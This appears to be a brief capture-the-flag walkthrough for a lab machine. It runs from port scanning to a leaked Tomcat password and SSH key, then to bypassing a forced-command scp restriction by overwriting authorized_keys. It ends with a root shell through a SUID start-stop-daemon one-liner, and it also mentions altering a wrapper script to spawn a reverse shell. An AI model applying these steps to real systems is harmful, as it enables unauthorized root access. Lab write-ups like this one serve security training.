nmap shows ports 80, 8080, and a bunch of rpc ports open
deep nmap reveals 7742, which is a webpage for login

with a lot of patience, we find
`http://192.168.246.100:7742/zipfiles`
nothing in francis's home

in max's home, id_rsa and
```
<role rolename="manager-gui"/>
<user username="tomcat" password="VTUD2XxJjf5LPmu6" roles="manager-gui"/>
```
The apache is only available to access from localhost
If privesc from max fails, we'll have to go the apache way
`ssh -L 8080:127.0.0.1:8080 max@192.168.246.100 -i id_rsa_max`

However, ssh doesnt work, only scp does
So we need to figure out a way to get rev shell from scp

We can put a rev shell in /var/www and hope that it is php, and we can access it through one of web ports. OR, we can just overwrite interesting files, such as the once making scp takeover, whenever ssh is called
HINT TAKEN :  this is the authorized_keys file
```txt
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb
...<snip>...
/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
```
we take the top off, and only keep the part from ssh-rsa onwards 

`scp -i id_rsa_max replace_as_authorized_keys max@192.168.246.100:/home/max/.ssh/authorized_keys` just wouldnt work. but it worked with -O
`scp -i id_rsa_max -O replace_as_authorized_keys max@192.168.246.100:/home/max/.ssh/authorized_keys`

SUID are set for start-stop-daemon
`/usr/sbin/start-stop-daemon -S -x /bin/sh -- -p`
root!

---
---
---
In other walkthroughs, we also find the  scp_wrapper.sh file modification.
The original file would check if 'scp' is in the command. if not, it would give "access denied"
Instead, we can make it give us a reverse shell when scp is not found in the command.
Overwrite the file, and we get rev shell!